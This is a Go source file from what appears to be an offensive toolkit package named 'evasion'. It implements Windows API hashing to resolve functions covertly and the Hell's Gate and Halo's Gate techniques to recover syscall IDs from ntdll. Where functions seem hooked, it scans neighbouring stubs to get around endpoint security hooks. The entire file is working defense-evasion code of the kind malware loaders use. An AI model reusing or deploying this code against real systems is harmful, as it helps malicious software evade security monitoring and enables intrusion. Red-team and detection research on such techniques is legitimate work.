package evasion

/*

References:
https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware

*/

import (
	"bytes"
	"encoding/binary"
	"errors"
  "golang.org/x/sys/windows"

	// Third-party
	"github.com/Binject/debug/pe"
	"github.com/awgh/rawreader"
)

/*

This file contains various functions that use API hashing to retrieve the pointer to a function or its syscall

*/

// Receive a hash, the full path to DLL and the hashing function used to encode the function, then you use the pointer like GetCurrentProccess.Call()
func GetFuncPtr(hash string, dll string, hashing_function func(str string) string) (*windows.LazyProc, string, error) {
  // Open and parse PE file
  pe_file, err := pe.Open(dll)
  if err != nil {
    return &windows.LazyProc{}, "", err
  }
  defer pe_file.Close()

  // Get export table
  exports, err := pe_file.Exports()
  if err != nil {
    return &windows.LazyProc{}, "", err
  }

  for _, exp := range exports {
    if hash == hashing_function(exp.Name) {
      return windows.NewLazyDLL(dll).NewProc(exp.Name), exp.Name, nil
    }
  }

  return &windows.LazyProc{}, "", errors.New("function not found")
}

// retrieve syscall using hashing to use it later like Syscall(sysid, ...)
func GetSysIdHash(hash string, dll string, hashing_func func(str string) string) (uint16, string, error) {
	dll_pe, err := pe.Open(dll) // Open and parse dll as a PE
	if err != nil {
		return 0, "", err
	}
	defer dll_pe.Close()

	exports, err := dll_pe.Exports() // Get exported functions
	if err != nil {
		return 0, "", err
	}

	for _, ex := range exports {
		if hashing_func(ex.Name) == hash {

			offset := rvaToOffset(dll_pe, ex.VirtualAddress)
			bBytes, err := dll_pe.Bytes()
			if err != nil {
				return 0, "", err
			}

			buff := bBytes[offset : offset+10]
			if !bytes.HasPrefix(buff, HookCheck) {
				return 0, "", MayBeHookedError{Foundbytes: buff}
			}

			sysId := binary.LittleEndian.Uint16(buff[4:8])
			return sysId, ex.Name, nil
		}
	}

	return 0, "", errors.New("syscall ID not found")
}

// retrieve syscall using hashing and Hell's Gate + Halo's Gate technique like GetSysId() function
func GetSysIdHashHalos(hash string, hashing_func func(str string) string) (uint16, string, error) {
	var ntdll_pe *pe.File
	var err error

	s, si := inMemLoads(string([]byte{'n', 't', 'd', 'l', 'l'})) // Load ntdll in memory

	rr := rawreader.New(uintptr(s), int(si))
	ntdll_pe, err = pe.NewFileFromMemory(rr) // Parse PE file
	if err != nil {
		return 0, "", err
	}
	defer ntdll_pe.Close()

	exports, err := ntdll_pe.Exports() // Get exported functions
	if err != nil {
		return 0, "", err
	}

	for _, exp := range exports {
		if hashing_func(exp.Name) == hash {
			offset := rvaToOffset(ntdll_pe, exp.VirtualAddress)
			bBytes, err := ntdll_pe.Bytes()
			if err != nil {
				return 0, "", err
			}

			buff := bBytes[offset : offset+10]
			sysId, e := CheckBytes(buff)

			var hook_err MayBeHookedError
			if errors.As(e, &hook_err) {
				// Enter here if function seems to be hooked
				start, size := GetNtdllStart()

				// Search forward
				distanceNeighbor := 0
				for i := uintptr(offset); i < start+size; i += 1 {
					if bBytes[i] == byte('\x0f') && bBytes[i+1] == byte('\x05') && bBytes[i+2] == byte('\xc3') {
						distanceNeighbor++

						sysId, e := CheckBytes(bBytes[i+14 : i+14+8]) // Check hook again
						if !errors.As(e, &hook_err) {                 // Return syscall ID if it isn't hooked
							return sysId - uint16(distanceNeighbor), "", e
						}
					}
				}

				// Search backward
				distanceNeighbor = 1
				for i := uintptr(offset) - 1; i > 0; i -= 1 {
					if bBytes[i] == byte('\x0f') && bBytes[i+1] == byte('\x05') && bBytes[i+2] == byte('\xc3') {
						distanceNeighbor++

						sysId, e := CheckBytes(bBytes[i+14 : i+14+8])
						if !errors.As(e, &hook_err) { // Return syscall ID if it isn't hooked
							return sysId + uint16(distanceNeighbor) - 1, "", e
						}
					}
				}
			} else {
				// Return syscall id as it isn't hooked
				return sysId, "", nil
			}
		}
	}

	return 0, "", errors.New("syscall ID not found")
}
